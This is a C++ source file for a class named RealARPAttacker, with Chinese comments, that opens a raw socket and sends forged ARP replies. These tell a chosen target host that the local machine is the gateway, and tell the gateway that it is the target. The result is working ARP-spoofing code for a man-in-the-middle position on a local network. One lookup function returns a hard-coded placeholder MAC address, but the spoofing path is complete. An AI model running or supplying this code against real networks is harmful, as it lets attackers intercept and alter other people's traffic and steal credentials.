#include "real_arp_attacker.h"
#include <iostream>
#include <sstream>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <chrono>
#include <iomanip>

RealARPAttacker::~RealARPAttacker() {
    stop_all_attacks();
}

bool RealARPAttacker::initialize(const std::string& iface) {
    interface = iface;
    
    // 创建原始套接字
    raw_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (raw_socket == -1) {
        std::cerr << "❌ Failed to create raw socket (需要root权限): " << strerror(errno) << std::endl;
        return false;
    }
    
    // 获取网络接口索引
    interface_index = if_nametoindex(interface.c_str());
    if (interface_index == 0) {
        std::cerr << "❌ Failed to get interface index for " << interface << std::endl;
        close(raw_socket);
        raw_socket = -1;
        return false;
    }
    
    // 获取本地MAC和IP地址
    if (!get_local_mac_address() || !get_local_ip_address()) {
        std::cerr << "❌ Failed to get local network information" << std::endl;
        close(raw_socket);
        raw_socket = -1;
        return false;
    }
    
    initialized = true;
    std::cout << "✅ ARP Attacker initialized successfully" << std::endl;
    std::cout << "   Interface: " << interface << " (index: " << interface_index << ")" << std::endl;
    std::cout << "   Local MAC: " << local_mac << std::endl;
    std::cout << "   Local IP:  " << local_ip << std::endl;
    
    return true;
}

bool RealARPAttacker::execute_attack(const AttackTarget& target) {
    if (!initialized) {
        std::cerr << "❌ ARP Attacker not initialized" << std::endl;
        return false;
    }
    
    std::cout << "🎯 [REAL ATTACK] Executing ARP spoofing attack on " << target.target_ip 
              << " (Session: " << target.session_id << ")" << std::endl;
    
    // 记录攻击开始
    log_attack_to_temp_file(target, "ATTACK_START");
    
    // 发送ARP欺骗包 - 告诉目标我们是网关
    bool success1 = send_arp_packet(target.gateway_ip, local_mac,    // 伪装成网关
                                   target.target_ip, target.target_mac,  // 发送给目标
                                   ARPOP_REPLY);
    
    // 发送ARP欺骗包 - 告诉网关我们是目标
    bool success2 = send_arp_packet(target.target_ip, local_mac,     // 伪装成目标
                                   target.gateway_ip, target.gateway_mac, // 发送给网关
                                   ARPOP_REPLY);
    
    if (success1 && success2) {
        std::cout << "✅ [REAL ATTACK] ARP spoofing packets sent successfully to " << target.target_ip << std::endl;
        log_attack_to_temp_file(target, "ATTACK_SUCCESS");
        return true;
    } else {
        std::cerr << "❌ [REAL ATTACK] Failed to send ARP spoofing packets to " << target.target_ip << std::endl;
        log_attack_to_temp_file(target, "ATTACK_FAILED");
        return false;
    }
}

std::string RealARPAttacker::resolve_mac_address(const std::string& ip) {
    if (!initialized) {
        return "";
    }
    
    // 发送ARP请求
    std::string broadcast_mac = "ff:ff:ff:ff:ff:ff";
    bool sent = send_arp_packet(local_ip, local_mac, ip, broadcast_mac, ARPOP_REQUEST);
    
    if (sent) {
        std::cout << "📡 [REAL ARP] ARP request sent for " << ip << std::endl;
        // 在实际实现中，这里需要监听ARP回复
        // 为了简化，这里返回一个模拟的MAC地址
        return "00:11:22:33:44:55"; // 这里应该通过监听ARP回复获得真实MAC
    }
    
    return "";
}

void RealARPAttacker::stop_all_attacks() {
    if (raw_socket != -1) {
        close(raw_socket);
        raw_socket = -1;
    }
    initialized = false;
    std::cout << "🛑 All ARP attacks stopped" << std::endl;
}

bool RealARPAttacker::get_local_mac_address() {
    struct ifaddrs *ifap, *ifa;
    if (getifaddrs(&ifap) == -1) {
        return false;
    }
    
    for (ifa = ifap; ifa != nullptr; ifa = ifa->ifa_next) {
        if (strcmp(ifa->ifa_name, interface.c_str()) == 0 && ifa->ifa_addr->sa_family == AF_PACKET) {
            struct sockaddr_ll *s = (struct sockaddr_ll*)ifa->ifa_addr;
            std::stringstream ss;
            for (int i = 0; i < 6; i++) {
                if (i > 0) ss << ":";
                ss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(s->sll_addr[i]);
            }
            local_mac = ss.str();
            freeifaddrs(ifap);
            return true;
        }
    }
    
    freeifaddrs(ifap);
    return false;
}

bool RealARPAttacker::get_local_ip_address() {
    struct ifaddrs *ifap, *ifa;
    if (getifaddrs(&ifap) == -1) {
        return false;
    }
    
    for (ifa = ifap; ifa != nullptr; ifa = ifa->ifa_next) {
        if (strcmp(ifa->ifa_name, interface.c_str()) == 0 && ifa->ifa_addr->sa_family == AF_INET) {
            struct sockaddr_in* sa = (struct sockaddr_in*)ifa->ifa_addr;
            local_ip = inet_ntoa(sa->sin_addr);
            freeifaddrs(ifap);
            return true;
        }
    }
    
    freeifaddrs(ifap);
    return false;
}

bool RealARPAttacker::send_arp_packet(const std::string& src_ip, const std::string& src_mac,
                                     const std::string& dst_ip, const std::string& dst_mac,
                                     uint16_t op_code) {
    // 构造ARP包
    std::vector<uint8_t> packet = build_arp_packet(src_ip, src_mac, dst_ip, dst_mac, op_code);
    if (packet.empty()) {
        return false;
    }
    
    // 构造目标地址
    struct sockaddr_ll dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sll_family = AF_PACKET;
    dest_addr.sll_ifindex = interface_index;
    dest_addr.sll_protocol = htons(ETH_P_ARP);
    dest_addr.sll_halen = 6;
    
    // 设置目标MAC地址
    if (dst_mac == "ff:ff:ff:ff:ff:ff") {
        // 广播
        memset(dest_addr.sll_addr, 0xff, 6);
    } else {
        mac_string_to_bytes(dst_mac, dest_addr.sll_addr);
    }
    
    // 发送数据包
    ssize_t sent = sendto(raw_socket, packet.data(), packet.size(), 0,
                         (struct sockaddr*)&dest_addr, sizeof(dest_addr));
    
    if (sent == -1) {
        std::cerr << "❌ Failed to send ARP packet: " << strerror(errno) << std::endl;
        return false;
    }
    
    std::cout << "📤 ARP packet sent: " << src_ip << " (" << src_mac << ") -> " 
              << dst_ip << " (" << dst_mac << "), op=" << op_code << std::endl;
    
    return true;
}

std::vector<uint8_t> RealARPAttacker::build_arp_packet(const std::string& src_ip, const std::string& src_mac,
                                                      const std::string& dst_ip, const std::string& dst_mac,
                                                      uint16_t op_code) {
    std::vector<uint8_t> packet(42); // 以太网头(14) + ARP包(28)
    
    // 以太网头部
    uint8_t* eth_header = packet.data();
    
    // 目标MAC地址
    if (!mac_string_to_bytes(dst_mac, eth_header)) {
        if (dst_mac == "ff:ff:ff:ff:ff:ff") {
            memset(eth_header, 0xff, 6);
        } else {
            return {};
        }
    }
    
    // 源MAC地址
    if (!mac_string_to_bytes(src_mac, eth_header + 6)) {
        return {};
    }
    
    // 以太网类型 (ARP)
    *(uint16_t*)(eth_header + 12) = htons(ETH_P_ARP);
    
    // ARP头部
    uint8_t* arp_header = eth_header + 14;
    
    // ARP包结构
    *(uint16_t*)(arp_header + 0) = htons(1);           // Hardware type (Ethernet)
    *(uint16_t*)(arp_header + 2) = htons(ETH_P_IP);    // Protocol type (IP)
    *(uint8_t*)(arp_header + 4) = 6;                   // Hardware address length
    *(uint8_t*)(arp_header + 5) = 4;                   // Protocol address length
    *(uint16_t*)(arp_header + 6) = htons(op_code);     // Operation
    
    // 发送者硬件地址
    mac_string_to_bytes(src_mac, arp_header + 8);
    
    // 发送者协议地址
    ip_string_to_bytes(src_ip, arp_header + 14);
    
    // 目标硬件地址
    if (op_code == ARPOP_REQUEST) {
        memset(arp_header + 18, 0, 6); // ARP请求时目标MAC为0
    } else {
        mac_string_to_bytes(dst_mac, arp_header + 18);
    }
    
    // 目标协议地址
    ip_string_to_bytes(dst_ip, arp_header + 24);
    
    return packet;
}

bool RealARPAttacker::mac_string_to_bytes(const std::string& mac_str, uint8_t* mac_bytes) {
    if (mac_str.length() != 17) return false; // xx:xx:xx:xx:xx:xx
    
    std::stringstream ss(mac_str);
    std::string byte_str;
    int i = 0;
    
    while (std::getline(ss, byte_str, ':') && i < 6) {
        mac_bytes[i++] = static_cast<uint8_t>(std::stoul(byte_str, nullptr, 16));
    }
    
    return i == 6;
}

bool RealARPAttacker::ip_string_to_bytes(const std::string& ip_str, uint8_t* ip_bytes) {
    struct in_addr addr;
    if (inet_aton(ip_str.c_str(), &addr) == 0) {
        return false;
    }
    
    memcpy(ip_bytes, &addr.s_addr, 4);
    return true;
}

void RealARPAttacker::log_attack_to_temp_file(const AttackTarget& target, const std::string& action) {
    std::ofstream log_file("/tmp/arp_attack_log.txt", std::ios::app);
    if (log_file.is_open()) {
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        
        log_file << "[" << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S") << "] "
                 << action << " - Session: " << target.session_id 
                 << ", Target: " << target.target_ip 
                 << ", Gateway: " << target.gateway_ip 
                 << ", Interface: " << target.interface << std::endl;
        
        log_file.close();
        
        // 只在第一次攻击时输出文件位置
        static bool first_log = true;
        if (first_log) {
            std::cout << "📝 Attack logs are being written to: /tmp/arp_attack_log.txt" << std::endl;
            first_log = false;
        }
    }
}

std::string RealARPAttacker::get_last_error() const {
    return strerror(errno);
}
